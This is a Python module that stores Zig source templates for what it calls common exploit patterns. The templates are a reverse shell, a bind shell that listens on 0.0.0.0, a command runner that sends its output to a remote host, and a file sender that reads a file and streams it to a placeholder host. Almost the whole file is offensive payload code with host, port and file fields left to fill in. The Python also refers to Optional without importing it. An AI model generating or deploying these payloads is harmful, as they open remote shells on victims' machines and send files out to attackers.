#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Zig templates for common exploit patterns
"""

TEMPLATES = {
    'reverse_shell': '''const std = @import("std");
const net = std.net;

pub fn main() !void {
    const host = "{{host}}";
    const port = {{port}};
    
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    
    const address = try net.Address.resolveIp(host, port);
    var stream = try net.tcpConnectToAddress(address);
    defer stream.close();
    
    // Spawn shell
    const shell = "/bin/sh";
    var argv = [_][]const u8{ shell, "-i" };
    var env = std.process.getEnvMap(allocator) catch unreachable;
    defer env.deinit();
    
    try std.process.Child.exec(.{
        .allocator = allocator,
        .argv = &argv,
        .env_map = &env,
        .stdin = .{ .file = stream.handle },
        .stdout = .{ .file = stream.handle },
        .stderr = .{ .file = stream.handle },
    });
}
''',
    
    'bind_shell': '''const std = @import("std");
const net = std.net;

pub fn main() !void {
    const port = {{port}};
    
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    
    // Bind to port
    const address = try net.Address.resolveIp("0.0.0.0", port);
    var server = net.StreamServer.init(.{ .reuse_address = true });
    try server.listen(address);
    defer server.deinit();
    
    // Accept connection
    var stream = try server.accept();
    defer stream.stream.close();
    
    // Spawn shell
    const shell = "/bin/sh";
    var argv = [_][]const u8{ shell, "-i" };
    var env = std.process.getEnvMap(allocator) catch unreachable;
    defer env.deinit();
    
    try std.process.Child.exec(.{
        .allocator = allocator,
        .argv = &argv,
        .env_map = &env,
        .stdin = .{ .file = stream.stream.handle },
        .stdout = .{ .file = stream.stream.handle },
        .stderr = .{ .file = stream.stream.handle },
    });
}
''',
    
    'command_exec': '''const std = @import("std");
const net = std.net;

pub fn main() !void {
    const host = "{{host}}";
    const port = {{port}};
    const command = "{{command}}";
    
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    
    const address = try net.Address.resolveIp(host, port);
    var stream = try net.tcpConnectToAddress(address);
    defer stream.close();
    
    // Execute command and send output
    var argv = [_][]const u8{ "/bin/sh", "-c", command };
    var env = std.process.getEnvMap(allocator) catch unreachable;
    defer env.deinit();
    
    const result = try std.process.Child.exec(.{
        .allocator = allocator,
        .argv = &argv,
        .env_map = &env,
        .max_output_bytes = 1024 * 1024,
    });
    
    _ = try stream.write(result.stdout);
    _ = try stream.write(result.stderr);
}
''',
    
    'file_download': '''const std = @import("std");
const net = std.net;

pub fn main() !void {
    const host = "{{host}}";
    const port = {{port}};
    const filepath = "{{filepath}}";
    
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    
    const address = try net.Address.resolveIp(host, port);
    var stream = try net.tcpConnectToAddress(address);
    defer stream.close();
    
    // Read file
    const file = try std.fs.cwd().openFile(filepath, .{});
    defer file.close();
    
    const file_size = try file.getEndPos();
    var buffer = try allocator.alloc(u8, file_size);
    defer allocator.free(buffer);
    
    _ = try file.readAll(buffer);
    
    // Send file
    _ = try stream.write(buffer);
}
''',
}


def get_template(template_name: str) -> Optional[str]:
    """Get template by name"""
    return TEMPLATES.get(template_name)


def list_templates() -> list:
    """List all available templates"""
    return list(TEMPLATES.keys())

